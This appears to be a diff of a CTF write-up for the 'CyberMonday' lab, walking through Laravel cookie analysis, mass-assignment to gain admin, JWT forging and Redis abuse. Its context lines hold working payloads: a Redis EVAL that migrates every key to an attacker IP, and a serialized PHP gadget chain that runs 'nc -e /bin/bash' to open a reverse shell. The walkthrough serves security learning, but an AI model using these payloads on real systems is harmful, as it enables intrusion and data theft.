@@ -41,7 +41,9 @@ the wappalizer just flag default simple applications, like PHP, NGINX and a css 
 
 At devTools, we can check for some source files in application, and just file we can found is the tailwind.js properly, but when reach in storage for see any cookies, we can found this.
 ![Desktop View](/images/cybermonday/devTools.png)
+
 decoding this cookies, we have this:
+
 ![Desktop View](/images/cybermonday/cookie.png)
 
 Researching about cookies which have this format, we can found a laravel_session cookies, which the value was encoded with a special app key, in this case, we can't see the what is the value field. It's a kind of guessing, but in next step, we can confirm it.
@@ -75,7 +77,9 @@ After some attempts, this 400 chars trigger an SQL error, which return us a debu
 we also can find this queries and a git hash commit.
 
 ![Desktop View](/images/cybermonday/info2.png)
+
 ![Desktop View](/images/cybermonday/info3.png)
+
 > but the protagonist of this page, is the stacktrace page error, as can se above.
 > With this page, we can understand some snippets for application, and also can cause other failures to see other files. In this page, we can see this stacktrace was build in react, so probably is a component replacing the page which caused the error.
 > Considering this framework, any injection probably is inaccurate, since the command you will see in debugger is just a client-side, and we don't know yet how and where the input values are handled. 
@@ -85,6 +89,7 @@ we also can find this queries and a git hash commit.
 
 This was the first time i used nuclei to fuzzing or enumeration. I really don't like of most of massive scans, 'cause probably lose the mean of the process in CTF, but at this case, i think is a good idea test after so much enumeration:
 ![Desktop View](/images/cybermonday/fuzz.png)
+
 > after i really tested so much wordlists, i just try a new way:
 ![Desktop View](/images/cybermonday/fuzz2.png)
 
@@ -113,6 +118,7 @@ I didn't notice a biggest difference between commits, and the text commit is not
 
 
 ![Desktop View](/images/cybermonday/admin.png)
+
 We can see in this file, User.php, a file code referring in a parameter isAdmin which is a bool in protected array. 
 Following for other files, we can see "ProfileController.php", what import the "User.php" file.
 ![Desktop View](/images/cybermonday/admin2.png)
@@ -138,8 +144,10 @@ _token=bmBDgxDDl2EN8eeemlHkUbus6n8BeZWLcCUQmSwW&username=123&email=123%40gmail.c
 
 After it, we can explore the /dashboard route, with some graphs and other tabs in sidebar.
 ![Desktop View](/images/cybermonday/admin3.png)
+
 at changelog, the following screen it showed:
 ![Desktop View](/images/cybermonday/admin4.png)
+
 and checking this links, with found a new subdomain.
 
 ### Cookies, REDIS, Deserealization:
@@ -187,6 +195,7 @@ After see the community videos about this lab, we notice the "easiest" is using 
 after long hours (Four, to be exact), i finally understand how handle the path of the burpsuite inside of this tools. It's kinda be more no intuitive, but i really think this the most cool way.
 
 ![Desktop View](/images/cybermonday/jwt1.png)
+
 Now we have a admin session for the all API environment, which let us create some custom webhooks, called by a random UUID returned after your creation. 
 After some tests, we can work around two parameters:
 ```
@@ -224,14 +233,18 @@ ruby poc.rb -a 10.10.14.8 --attacker-port 6969 -s VIJZ2GkfTiv3lPvFxUztuSeU9p8WiU
 
 We also can dump the `laravel_session` through redis `SlAVEOF`:
 
+
 ![Desktop View](/images/cybermonday/redis.png)
+
 <https://redis.io/commands/migrate/?source=post_page-----fcf4671a6ae1-------------------------------->
 
 ```
 EVAL 'for k,v in pairs(redis.call(\"KEYS\", \"*\")) do redis.pcall(\"MIGRATE\",\"10.10.14.17"\",\"6379\",v,0,10000) end' 0\r\n\r\
 ```
 ![Desktop View](/images/cybermonday/redis2.png)
+
 ![Desktop View](/images/cybermonday/redis3.png)
+
 ```
 {"url":"http://redis:6379","method":"*3\r\n$3\r\nset\r\n$76\r\ncybermonday_database_cybermonday_cache_:4d453ae1-017c-46d0-9c21-6d60ab88b398\r\n$250\r\nO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:31:\"nc -e /bin/bash 10.10.16.9 8888\";}i:1;s:4:\"user\";}} \r\nQUIT\r\n"}
 ```
@@ -246,6 +259,7 @@ grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,
 {: .prompt-info }
 
 ![Desktop View](/images/cybermonday/redis4.png)
+
 After that, we can simply link the rsocx to proxychains:
 
 ```
